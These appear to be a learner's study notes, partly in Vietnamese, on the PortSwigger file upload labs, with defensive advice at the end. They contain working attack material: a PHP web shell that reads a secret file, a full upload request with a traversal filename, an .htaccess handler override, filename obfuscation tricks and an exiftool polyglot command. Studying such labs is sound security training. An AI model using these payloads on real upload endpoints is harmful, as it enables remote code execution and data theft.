# PortSwigger-File-Upload-Vulnerabilities

File Upload Vulns are when a server allow users uploading files to its filesystems without validating the files' conten, size, type...
(Server side scripts that allow remote code execution)

Impacts of a file upload attack depends on which aspects of the file the server fails to validate
- type: allow `.js`, `.php` => remote code execution
- filename: path traversal vulns, file overwrite
- size: DoS

## Exploiting unrestricted file uploads to deploy a web shell
### Lab: Remote code execution via web shell upload
Upload the Web shell to the avatar upload, then go back to the my account page to see the response to the image's GET request
```php
<?php
echo file_get_contents("/home/carlos/secret");
?>
```

## Exploiting flawed validation of file uploads
 One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`.
### Lab: Web shell upload via Content-Type restriction bypass
Use the same PHP web shell in the previous lab, but this time use Burp Suite Proxy to catch and edit the file content-type (change it to image/png or image/jpg). After successfully upload the web shell, do the same as the previous lab.

## Preventing file execution in user-accessible directories
While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net. Servers usually only run scripts whose MIME types are configured to execute. However, the configuration is different between directories. Directories for user-supplied files are often much stricter than other locations in the filesystem. If you can find a way to upload your scripts to dir that are not for user-supplied purposes,the server may execute for script.
### Lab: Web shell upload via path traversal
Change the file upload location by intercepting the `POST` request and change the file name to `..%2fweb_shell.php` (`%2f` is URL encode for `/`). Then intercept the GET request and fetch the script at `file/web_shell.php`. The php script is still the same as the two previous labs.
```
POST /my-account/avatar HTTP/1.1
Host: 0a0900b104f8940180a8494d00950066.web-security-academy.net
Cookie: session=5g1ZbR0876zZ0nHL8Waj4AAGlN0z3ipK
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary62350f29b9fba0568c8bc86caca57263
Content-Length: 531
Origin: https://0a0900b104f8940180a8494d00950066.web-security-academy.net
Referer: https://0a0900b104f8940180a8494d00950066.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

------geckoformboundary62350f29b9fba0568c8bc86caca57263
Content-Disposition: form-data; name="avatar"; filename="..%2fweb_shell.php"
Content-Type: application/x-php

<?php
echo file_get_contents("/home/carlos/secret");
?>
------geckoformboundary62350f29b9fba0568c8bc86caca57263
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary62350f29b9fba0568c8bc86caca57263
Content-Disposition: form-data; name="csrf"

MjQcLC8xZdztlPi9FO4XVwxYmVZz6uaI
------geckoformboundary62350f29b9fba0568c8bc86caca57263--

```


## About URL Encode and when to URL Encode your injections/requests

```
[Browser / Burp Suite] 
        │
        │ (1) HTTP Request gửi qua mạng
        ▼
[Web Server (Nginx / Apache / IIS)]
        │ 
        │ ──► (2) TỰ ĐỘNG URL Decode lần 1 (Parse Query String / Path)
        ▼
[Web Application Framework (Node.js, PHP, Spring...)]
        │
        │ ──► (3) Lưu tham số vào biến ($_GET, req.query, ...)
        │ ──► (4) Code của lập trình viên (Có thể gọi decodeURL() thêm lần nữa!)
        ▼
[Backend Feature / Vulnerable Function]
(Thực thi SQL Query, File Open, Command Exec...)
```

Chi tiết các bước:

- Trình duyệt / Burp Suite gửi request: Bạn viết URL.

- Web Server nhận request: Hầu hết mọi Web Server khi phân tích HTTP Request để trích xuất tham số (?file=... hoặc ?id=...) sẽ TỰ ĐỘNG URL Decode đúng 1 lần.

- App Framework xử lý: Nhận giá trị đã decode lần 1 và gán vào các biến (như $_GET['file'] trong PHP hay req.query.file trong Express).
- Code Lập trình viên: Nếu dev tự viết hàm xử lý thủ công (ví dụ gọi thêm urldecode() hay unquote()), giá trị đó sẽ bị Decode lần 2 (Double Decoding).
### Some popular URL encode to know

| Dạng Lỗ Hổng | Ký tự nguy hiểm dễ bị lỗi nếu khong URL Encode | Encoded Value | Giải thích nguyên nhân |
| :--- | :--- | :--- | :--- |
| **Path Traversal** | `/`<br>`\`<br>`.`<br>`NULL` | `%2f`<br>`%5c`<br>`%2e`<br>`%00` | Dấu `/` trong URL dùng để phân chia đường dẫn Endpoint. Nếu truyền `?path=../../etc` mà không encode, Web Server/WAF có thể tự động normalization đường dẫn hoặc hiểu lầm Router endpoint. |
| **SQL Injection** | Space<br>`#`<br>`&`<br>`'` | `%20` (hoặc `+`)<br>`%23`<br>`%26`<br>`%27` | Dấu `#` trong URL tượng trưng cho **URL Fragment** (Client-side). Nếu dùng `#` để comment SQL (`SELECT * FROM users WHERE id=1 #`), Browser/Burp sẽ cắt bỏ toàn bộ phần đằng sau `#` trước khi gửi đi! Bắt buộc encode `#` thành `%23`. |
| **Command Injection** | Space<br>`&`<br>`;`<br><code>\|</code><br>`\n` | `%20`<br>`%26`<br>`%3b`<br>`%7c`<br>`%0a` | Dấu `&` được HTTP dùng để phân tách các tham số (`?a=1&b=2`). Nếu bạn inject `?cmd=cat /etc/passwd & id`, Server sẽ hiểu `id` là tham số HTTP thứ hai chứ không nằm trong payload! Encode `&` thành `%26`. |
| **XSS (Reflected)** | `<`<br>`>`<br>`"`<br>`'` | `%3c`<br>`%3e`<br>`%22`<br>`%27` | Tránh bị Web Server hoặc Browser chặn/biến đổi cấu trúc HTML trước khi payload tới được ứng dụng. |
## Insufficient blacklisting of dangerous file types

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on. 

Servers generally won't execute files that are not pre-configured. In order to allow executing desired filetypes, developers will have to write them into config files. Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file.

### Lab: Web shell upload via extension blacklist bypass
As we have disscussed before, blacklisting is bad since you can't ban every single filetype. In this lab, we'll upload a `.htaccess` config file to treat/execute `.php5` filetype as a `.php` type, thus avoiding the `.php` file blacklisting.
```
AddHandler application/x-httpd-php .php .php3 .php4 .php5 .phtml
```

Upload the config file. There's no need to change the save location because of the `.htaccess` scope of effect in Apache. The config file will affect every thing in its current dir and subdirectories.
After that upload the `.php5` with the same content as the php ones we used in the previous file upload labs
```php
<?php
echo file_get_contents("home/carlos/secret");
?>
```

### Lab: Web shell upload via obfuscated file extension
Even if the blacklist is able to rule out dangerous executeable filetypes, there are still some obfuscation techniques you can use to bypass this:
- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: exploit.php.jpg
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: exploit.php.
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: exploit%2Ephp
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: exploit.asp;.jpg or exploit.asp%00.jpg
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension.
```
exploit.p.phphp
```

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique

Just need to obfuscate the filename a little bit, use NULL byte URL Encode. After successfully upload the shell, fetch it the same way as the previous labs do.

A null byte URL encoded is represented as `%00`. It corresponds to the ASCII NULL character (hexadecimal 0x00, decimal 0), which marks the end of a string in C/C++ and low-level system languages.

When an application written in a high-level language (like older versions of PHP or Java) processes a URL containing `%00`, it passes the decoded null byte (\0) down to underlying C-based filesystem or system APIs. The C API sees the \0 and treats it as the end of the string, dropping everything that follows it.
```
filename=web_shell.php%00.png
```

## Flawed validation of the file's contents
Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected (for example, check the dimension if the file is an image, or check for a specific byte sequence)

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata. 

To solve the lab, download Exiftool to be able to edit the file's metadata. We will take an image metadata and output it to a `.php` file. Inject the script into the Comment attribute of the file

When executing a polyglot file, the server returns the raw binary image data mixed directly with the output of the executed script. Because this creates a noisy response, wrapping the execution payload with starting and ending markers (such as START and END) makes it much easier to locate the extracted data within the response body.

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.png -o polyglot.php
```

### Tại sao mã PHP trong metadata lại có thể thực thi được 
Để hiểu lý do tại sao một tệp chứa mã PHP trong phần Metadata lại có thể thực thi được, chúng ta cần nhìn vào sự khác biệt giữa cách Web Server định tuyến tệp và cách trình thông dịch PHP (PHP Engine) đọc tệp.

#### 1. Web Server giao toàn bộ tệp cho PHP Engine xử lý

Khi một yêu cầu (request) gửi tới Web Server (như Apache hay Nginx) để lấy một tệp có đuôi .php (ví dụ: image.php), Web Server không quan tâm bên trong tệp đó là ảnh hay văn bản.

Quy trình diễn ra như sau:

- Web Server kiểm tra quy tắc cấu hình: "Mọi tệp kết thúc bằng .php phải được chuyển sang cho PHP Engine xử lý."

- Web Server chuyển toàn bộ nội dung thô (raw bytes) của tệp image.php sang cho PHP Engine.

#### 2. Cách PHP Engine quét và phân tích dữ liệu (Parsing Mechanism)

Trình thông dịch PHP được thiết kế theo cơ chế tìm kiếm thẻ mở và thẻ đóng.

Khi PHP Engine nhận được một tệp nhị phân (như tệp ảnh):

- Nó sẽ đọc dữ liệu từ byte đầu tiên cho đến byte cuối cùng.

- Bỏ qua dữ liệu thô: Tất cả các byte nhị phân của ảnh (như Magic Bytes, thông tin điểm ảnh...) không nằm trong cặp thẻ <?php ... ?> sẽ bị PHP Engine coi là "văn bản tĩnh" (plain text) và in thẳng ra màn hình/HTTP Response.

- Thực thi khi thấy thẻ mở: Ngay khi con trỏ đọc đến chuỗi ký tự `<?php` (cho dù chuỗi này nằm ở đầu tệp, giữa dữ liệu điểm ảnh, hay nằm trong khối Metadata/Comment), PHP Engine sẽ chuyển sang chế độ biên dịch và thực thi các câu lệnh đằng sau đó cho đến khi gặp thẻ đóng `?>`

## Exploiting file upload race conditions
- Khi upload một file lên server, các modern framework sẽ thực hiện lưu file trực tiếp vào một dir/sandbox tạm thời để kiểm tra và loại bỏ nếu không an toàn. Race condition vuln xảy ra giữa khoảng thời gian file được upload lên và thời gian kiểm tra xong file. Chỉ cần request vào đường dẫn file đó trong khoảng thời gian này vẫn hoàn toàn có thể thực hiện RCE

- Tương tự với việc upload file bằng URL. Server sẽ phải truy cập URL đó, fetch một local copy về rồi mới kiểm tra.
- Có thể phòng tránh điều này bằng việc lưu file về với randomized name. Không nên dùng các hàm pseudo-random như `uniqid()` của php, vẫn có thể bị brute-force
- Kẻ tấn công cũng có thể kéo dài thời gian kiểm tra bằng cách up các file kích thước lớn lên (có thể là script + padding).

### Defensive Best Practices

Để xây dựng một cơ chế phòng thủ toàn diện (Defense-in-Depth) chống lại Race Condition khi upload, hệ thống cần đảm bảo các nguyên tắc sau:
A. Tránh lưu file tạm vào Web Root

Sử dụng thư mục ngoài Web Root: Tất cả các tệp tạm thời trong quá trình upload phải được lưu ở một thư mục không thuộc phạm vi truy cập của máy chủ web (phía ngoài thư mục public/web root), khiến người dùng không thể truy cập trực tiếp qua đường dẫn HTTP/HTTPS.

In-Memory Processing: Đối với các tệp tin nhỏ hoặc ảnh, xử lý trực tiếp trên luồng bộ nhớ (RAM Stream) thay vì ghi xuống đĩa cứng trước khi kiểm tra.

B. Đặt tên file ngẫu nhiên an toàn (Cryptographically Secure)

Không sử dụng các hàm dựa trên thời gian thực như time(), microtime(), hay uniqid().

Sử dụng các hàm sinh chuỗi ngẫu nhiên an toàn về mặt mật mã (Cryptographically Secure Pseudo-Random Number Generator - CSPRNG) kết hợp với thuật toán UUID v4 hoặc băm SHA-256:

Trong PHP: `bin2hex(random_bytes(16))`

Trong Python: `secrets.token_hex(16) hoặc uuid.uuid4()`

## Exploiting file upload vulnerabilities without remote code execution
While server side RCE is the most serious attack when it comes to file upload vulns, there are still other ways that the attacker can take advatage of .
### Uploading malicious client-side scripts
If you can upload HTML/SVG image, you can potentially create `<script>` tag to create XSS payloads. When the upload file then appears on a page that is visited by another user, the script will the executed when the browser try to render the page (Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it. )

### Exploiting vulnerabilities in the parsing of uploaded files
### Uploading file using PUT
Some servers are configured to support `PUT` requests. If handled insecurely, this can provide alternate means of uploading malicious files, even if the `PUT` request is not available via web interface. You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method. 

## How to prevent file upload vulnerabilities
Defensive best pratices:
- Use file extension whitelist instead of blacklist
- Validating the filename to avoid path traversal/overwriting upload file (best way is to use randomized filename when store)
- Do not update the file to the server's filesystem until it had been validated. Use established validation frameworks, you shouldn't try to reinvente the wheel